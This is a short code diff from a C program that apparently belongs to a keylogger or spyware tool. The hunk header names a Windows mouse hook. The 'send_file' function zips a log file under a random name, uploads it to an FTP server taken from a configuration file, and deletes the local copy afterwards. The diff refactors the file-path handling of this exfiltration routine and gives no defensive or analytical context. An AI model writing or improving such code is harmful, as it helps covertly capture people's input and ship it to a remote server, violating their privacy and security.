@@ -541,21 +541,22 @@ LRESULT CALLBACK mouse_hook(int n_code, DWORD w_param, DWORD l_param)
 bool send_file()
 {
     struct ftp_config ftp;
-    char path[STR_SIZE];
+    //char path[STR_SIZE];
+    //char zip_file_path[STR_SIZE];
     char zip_file_name[STR_SIZE];
-    char zip_file_path[STR_SIZE];
     bool uploaded;
 
     read_config( CONF_FILE, &ftp );
     sprintf(ftp.dir, FTP_DIR);
-    get_this_dir_path(path);
     sprintf(zip_file_name, "%s%d%s", "data", _random(), ".zip");
-    sprintf(zip_file_path, "%s%s", path, zip_file_name);
+
+    //get_this_dir_path(path);
+    //sprintf(zip_file_path, "%s%s", path, zip_file_name);
 	
-    create_zip_file(zip_file_path, LOG_FILE);
-    uploaded = upload_file( &ftp, zip_file_name, zip_file_path);
+    create_zip_file(zip_file_name, LOG_FILE);
+    uploaded = upload_file( &ftp, zip_file_name, zip_file_name);
 	if(uploaded)
-		remove(zip_file_path);
+        remove(zip_file_name);
 
 	return uploaded;
 }
